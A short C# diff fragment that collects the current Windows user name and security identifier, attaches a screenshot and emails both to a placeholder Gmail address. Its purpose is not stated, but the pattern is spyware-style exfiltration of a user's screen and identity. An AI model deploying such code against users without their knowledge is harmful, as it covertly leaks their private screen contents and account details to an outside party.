@@ -1,0 +1,13 @@
+System.Net.Mail.MailAddress toAddress = new System.Net.Mail.MailAddress("xxxxx@gmail.com");
+System.Net.Mail.MailAddress fromAddress = new System.Net.Mail.MailAddress("thismachine@xyz.com");
+System.Net.Mail.MailMessage mm = new System.Net.Mail.MailMessage(fromAddress, toAddress);
+sysName = System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString();
+sysUser = System.Security.Principal.WindowsIdentity.GetCurrent().User.ToString();
+mm.Subject = sysName + " " + sysUser;
+string filename = string.Empty;
+System.Net.Mail.Attachment mailAttachment = new System.Net.Mail.Attachment(printScreen);
+mm.Attachments.Add(mailAttachment);
+mm.IsBodyHtml = true;
+mm.BodyEncoding = System.Text.Encoding.UTF8;
+sendMail(mm);
+
